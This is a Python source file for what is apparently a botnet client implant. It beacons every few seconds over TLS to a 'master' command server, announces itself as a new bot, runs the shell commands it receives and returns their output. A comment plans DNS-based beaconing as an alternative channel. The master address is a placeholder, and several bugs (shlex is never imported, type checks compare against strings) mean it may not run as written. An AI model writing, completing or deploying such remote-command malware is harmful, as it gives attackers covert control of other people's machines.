import binascii
import socket
import sys
import ssl
import subprocess
import random
import time
import Queue
import os
import threading
import jsonpickle
import simplejson 	# jsonpickle depends on this below python 2.6

from OpenSSL import crypto, SSL
from hashlib import *
from exec_token import Exec_Token
from set_token import Set_Token
from reply_token import Reply_Token
from command import Command


## Information

clientID = ""
localhost = "127.0.0.1"
master = "127.0.0.1"
cert = "cert.pem"

## Fields

sleepDuration = 5	# Interval between beacon attempts
debugPrint = True	# Print error messages on the local console
pythonErrors = True	# Send error messages to server


## Management Queues

todoQ = Queue.Queue()	# Command objects that must be completed yet
sendQ = Queue.Queue()	# Completed Command objects to be sent back to the server
errQ = Queue.Queue()	# Holds python error messages


## Threads

class Handler (threading.Thread):
	
	def __init__(self, pyObj):
		
		self.obj = pyObj
		threading.Thread.__init__(self)

	def run(self):	
		
		try:	
			if type(self.obj) == "Exec_Token":
				if debugPrint:
					print("Received Exec_Token")
				for c in self.obj.cmd:
					if debugPrint:
						print("Executing... "+str(c))
					start = time.time()
					out = runCommand(c.cmd)
					end = time.time()
					result = Command( start, end, c.cmd, out )
					sendQ.put(result)
					if debugPrint:
						print("Results: "+str(result))
			elif type(self.obj) == "Set_Token":
				if debugPrint:
					print("Received Set_Token")
	
		except Exception as e:	
			if pythonErrors:
				errQ.put(e)
			if debugPrint:
				print("Error handling input: "+str(e))


## Helper Functions

def runCommand (cmd):
	try:
		p = subprocess.Popen(shlex.split(cmd), stdout=subprocess.PIPE)
		return p.stdout.read()
	
	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("Error when attempting to execute command: "+str(e))
	

def makeJSON (pyObj):
	
	try:
		jsonObj = jsonpickle.encode(pyObj)
		if debugPrint:
			print("\n\nJSON Printout: \n"+str(jsonObj))
		return jsonObj

	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("Error converting to JSON: "+str(e))

def getJSON (jsonObj):

	try:
		pyObj = jsonpickle.decode(jsonObj)
		if debugPrint:
			print("\n\nPyObj Printout: \n"+str(pyObj))
		return pyObj

	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("Error converting from JSON: "+str(e))


def send (dst_addr, dst_port, data):
	
	try:
		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
		context = ssl.create_default_context()
		context.load_verify_locations(cert)
		sock = context.wrap_socket(s, server_hostname=master)
		sock.connect(( dst_addr, dst_port ))
		sock.sendall(data)
		response = sock.recv()
		if debugPrint:
			print("Data Sent: "+data)
			print("Response:  "+response)
		return response

	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("Error when attempting to Send: "+str(e))
			

def beacon (dst_addr, dst_port, init=False):
	
	try:
		cmds = []
		info = []
		if init:
			cmds = [ Command(time.time(), time.time(), "NEW-BOT-INITIALIZED", "") ]
			info = [0]
		while not sendQ.empty():
			cmds.append(sendQ.get(True))
 		sendObj = makeJSON( Reply_Token( clientID, localhost, cmds, info ) )
		response = send (master, 443, sendObj)
		handler = Handler(response)
		handler.start()
	
	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("Error when attempting to Beacon: "+str(e))
	

def generateCert():
	try:
		k = crypto.PKey()
		k.generate_key(crypto.TYPE_RSA, 4096)
		c = crypto.X509()
		c.set_serial_number(1000)
		c.gmtime_adj_notBefore(0)
		c.gmtime_adj_notAfter(3153600000)
		c.set_pubkey(k)
		c.sign(k, 'sha1')
		open(cert, "wt").write(crypto.dump_certificate(crypto.FILETYPE_PEM, c))
	
	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("Error when attempting to generate a certificate: "+str(e))
	

def init ():

	try:
		localhost = [l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)), s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET, socket.SOCK_DGRAM)]][0][1]]) if l][0][0]
		hasher = sha512()
		hashed = hasher.update  (
					  str(localhost).encode('utf-8') +\
					  str(time.time()).encode('utf-8') +\
					  str(random.randint(1,sys.maxsize)).encode('utf-8') +\
					  str(sys.getrefcount(hasher)).encode('utf-8')
					)
		clientID = str(binascii.hexlify(hasher.digest())).encode('utf-8') 
		if not os.path.isfile(cert):			
			generateCert()	
	
		if debugPrint:
			print(
				"\n\nInit:\n"+\
				"\n\tLocal IP:  "+str(localhost)+\
				"\n\tMaster IP: "+str(master)+\
				"\n\tClient ID: "+str(clientID)+\
				"\n\tCert Path: "+str(cert)+\
				"\n\tSleep Dur: "+str(sleepDuration)
			     )

	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("Error when attempting to initialize: "+str(e))
	
def main ():

	try:
		init()
		beacon(master, 443, True)
		while True:
			time.sleep(sleepDuration)
			beacon(master, 443)	## TODO Implement more beacon methods (DNS, etc.)
	
	except Exception as e:
		if pythonErrors:
			errQ.put(e)
		if debugPrint:
			print("General Error: "+str(e))
	

if __name__ == "__main__":
	main()


